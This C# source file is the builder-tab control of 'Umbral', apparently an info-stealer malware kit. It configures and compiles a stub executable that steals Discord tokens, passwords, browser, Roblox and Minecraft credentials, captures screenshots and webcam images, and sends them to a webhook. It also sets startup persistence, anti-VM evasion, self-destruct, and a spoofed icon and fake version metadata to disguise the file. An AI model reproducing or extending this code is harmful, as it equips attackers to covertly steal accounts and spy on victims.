using System;
using System.Windows.Forms;
using Umbral.builder.Build;

namespace Umbral.builder.User_Controls
{
    public partial class BuilderTab : UserControl
    {

        private const string BuildButtonEnabledPlaceHolder = "Build";
        private const string BuildButtonDisabledPlaceHolder = "Building...";
        private const string IconButtonDisabledPlaceHolder = "Selecting...";
        private const string IconButtonEnabledPlaceHolder = "Select Icon";
        private const string IconButtonSelectedPlaceHolder = "Unselect Icon";

        private string _iconPath;

        public BuilderTab()
        {
            InitializeComponent();
            ToolTip tooltip = new ToolTip();

            tooltip.SetToolTip(IconSelectButton, "Select icon for the stub.");
            tooltip.SetToolTip(BuildButton, "Build the stub.");
        }

        private void BuildButton_Click(object sender, EventArgs e)
        {
            Button buildButton = (Button)sender;
            if (buildButton.Text.Equals(BuildButtonEnabledPlaceHolder))
            {
                if (!(GeneralTab.StealTokens || GeneralTab.StealRobloxCookies || GeneralTab.StealCookies ||
                      GeneralTab.StealPasswords || GeneralTab.StealMinecraftSession || GeneralTab.TakeScreenshot || GeneralTab.CaptureWebcam))
                {
                    MessageBox.Show("Enable at least one of the stealing targets!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (GeneralTab.IsWebhookValid)
                {

                    SaveFileDialog saveFileDialog = new SaveFileDialog
                    {
                        AddExtension = true,
                        CheckPathExists = true,
                        FileName = "Umbral.exe",
                        Filter = "Executable File|*.exe"
                    };

                    if (saveFileDialog.ShowDialog().Equals(DialogResult.Cancel))
                        return;

                    BuildButton.Text = BuildButtonDisabledPlaceHolder;
                    Builder builder = new Builder
                    {
                        Output = saveFileDialog.FileName,
                        Webhook = GeneralTab.Webhook,
                        IconPath = _iconPath,

                        Ping = GeneralTab.Ping,
                        Startup = GeneralTab.Startup,
                        AntiVm = GeneralTab.AntiVm,
                        StealTokens = GeneralTab.StealTokens,
                        StealPasswords = GeneralTab.StealPasswords,
                        StealCookies = GeneralTab.StealCookies,
                        StealRobloxCookies = GeneralTab.StealRobloxCookies,
                        StealMinecraftSession = GeneralTab.StealMinecraftSession,
                        CaptureScreenshot = GeneralTab.TakeScreenshot,
                        SelfDestruct = GeneralTab.SelfDestruct,
                        CaptureWebcam = GeneralTab.CaptureWebcam,

                        AssemblyInformation = new AssemblyInfo
                        {
                            CompanyName = AssemblyTab.CompanyNameInfo,
                            AssemblyVersion = AssemblyTab.AssemblyVersionInfo,
                            FileDescription = AssemblyTab.FileDescriptionInfo,
                            FileVersion = AssemblyTab.FileVersionInfo,
                            InternalName = AssemblyTab.InternalNameInfo,
                            LegalCopyright = AssemblyTab.LegalCopyrightInfo,
                            LegalTrademarks = AssemblyTab.LegalTrademarksInfo,
                            OriginalFilename = AssemblyTab.OriginalFilenameInfo,
                            ProductName = AssemblyTab.ProductNameInfo,
                            ProductVersion = AssemblyTab.ProductVersionInfo
                        }
                    };

                    BuildButton.Text = BuildButtonEnabledPlaceHolder;

                    if (builder.Build(OutputTextBox))
                        MessageBox.Show("Build Success!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    else
                        MessageBox.Show("Build Failed!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    MessageBox.Show("Check the webhook before building!", "Builder", MessageBoxButtons.OK,
                        MessageBoxIcon.Exclamation);
                    return;
                }
            }

            OutputTextBox.AppendText("\r\nReady...");
        }

        private void IconSelectButton_Click(object sender, EventArgs e)
        {
            Button iconButton = (Button)sender;
            if (iconButton.Text.Equals(IconButtonEnabledPlaceHolder))
            {
                OpenFileDialog openFileDialog = new OpenFileDialog
                {
                    AddExtension = true,
                    CheckPathExists = true,
                    Filter = "Icon File|*.ico"
                };

                iconButton.Text = IconButtonDisabledPlaceHolder;
                if (openFileDialog.ShowDialog().Equals(DialogResult.Cancel))
                {
                    iconButton.Text = IconButtonEnabledPlaceHolder;
                    return;
                }

                _iconPath = openFileDialog.FileName;
                iconButton.Text = IconButtonSelectedPlaceHolder;
                OutputTextBox.AppendText("\r\nSelected icon.");
            }
            else if (iconButton.Text.Equals(IconButtonSelectedPlaceHolder))
            {
                _iconPath = string.Empty;
                iconButton.Text = IconButtonEnabledPlaceHolder;
                OutputTextBox.AppendText("\r\nUnselected icon.");
            }
        }

        private void OutputTextBox_TextChanged(object sender, EventArgs e)
        {
            TextBox textBox = (TextBox)sender;
            textBox.SelectionStart = textBox.Text.Length;
            textBox.ScrollToCaret();
        }
    }
}